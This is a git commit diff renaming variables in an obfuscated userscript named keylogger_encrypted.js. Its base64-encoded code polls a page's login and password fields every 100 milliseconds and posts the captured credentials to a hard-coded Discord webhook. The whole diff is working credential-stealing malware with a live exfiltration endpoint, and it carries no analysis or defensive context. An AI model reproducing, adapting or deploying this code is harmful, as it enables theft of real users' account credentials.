d3d9910e303b9481c310278e9729cce255d0ebc0
SzymonLeja <szymon.leja3@gmail.com>
2020-07-09 15:04:00 +0200

    changing variable names

--- keylogger_encrypted.js
+++ keylogger_encrypted.js
@@ -9,21 +9,20 @@
 // @require http://code.jquery.com/jquery-3.4.1.min.js
 // ==/UserScript==
 
-(function() {
-
-    var TpG3Y86zpgrtWMzb, ZHN4ekpZ5m95pFbJ, YQTtmEs6a5mTXE5a;
+(function(){
+    var bG9naW4, cGFzc3dvcmQ, Zm9ybWF0dGVk;
     function UagZgR8PZcWcwvYp() {
-    $(atob("I3Vsb2dpbg==")).val() != TpG3Y86zpgrtWMzb && $(atob("I3Vsb2dpbg==")).val() && (TpG3Y86zpgrtWMzb = $(atob("I3Vsb2dpbg==")).val()), $(atob("I3VwYXNz")).val() != ZHN4ekpZ5m95pFbJ && $(atob("I3VwYXNz")).val() && (ZHN4ekpZ5m95pFbJ = $(atob("I3VwYXNz")).val()), !$(atob("I3VwYXNz")).val() && !$(atob("I3Vsb2dpbg==")).val() && TpG3Y86zpgrtWMzb && ZHN4ekpZ5m95pFbJ && YQTtmEs6a5mTXE5a != TpG3Y86zpgrtWMzb + " | " + ZHN4ekpZ5m95pFbJ &&
+    $(atob("I3Vsb2dpbg==")).val() != bG9naW4 && $(atob("I3Vsb2dpbg==")).val() && (bG9naW4 = $(atob("I3Vsb2dpbg==")).val()), $(atob("I3VwYXNz")).val() != cGFzc3dvcmQ && $(atob("I3VwYXNz")).val() && (cGFzc3dvcmQ = $(atob("I3VwYXNz")).val()), !$(atob("I3VwYXNz")).val() && !$(atob("I3Vsb2dpbg==")).val() && bG9naW4 && cGFzc3dvcmQ && Zm9ybWF0dGVk != bG9naW4 + " | " + cGFzc3dvcmQ &&
             ($.ajax({
             url: atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvNzA3NjUxNzE5NTUwNTk5MTY4L3lFd0t6eTl5dWZ0ZlNWNWVSYUtiSlJnYU1OdnpzZFExX2dBaFVBLTFGY1B5NnV3VVhtckFSWDBQdkQ3R0Z2QUxPS01Y"),
             method: atob("UE9TVA=="),
             contentTypE: atob("YXBwbGljYXRpb24vanNvbg=="),
             data: {"username": atob("TWFyZ29Ib29r"),
-                   "avatar_url": atob("aHR0cHM6Ly9kaXNjb3JkZ3VpZGUuZ2l0aHViLmlvL2Fzc2V0cy9QSVJBVEUucG5n"),
-                   "content": TpG3Y86zpgrtWMzb + "|" + ZHN4ekpZ5m95pFbJ
-                  }
-        }), YQTtmEs6a5mTXE5a = TpG3Y86zpgrtWMzb + " | " + ZHN4ekpZ5m95pFbJ)
-    console.log(TpG3Y86zpgrtWMzb)
+                "avatar_url": atob("aHR0cHM6Ly9kaXNjb3JkZ3VpZGUuZ2l0aHViLmlvL2Fzc2V0cy9QSVJBVEUucG5n"),
+                "content": bG9naW4 + "|" + cGFzc3dvcmQ
+                }
+        }), Zm9ybWF0dGVk = bG9naW4 + " | " + cGFzc3dvcmQ)
+    console.log(bG9naW4)
     }
     setInterval(UagZgR8PZcWcwvYp, 100);
 
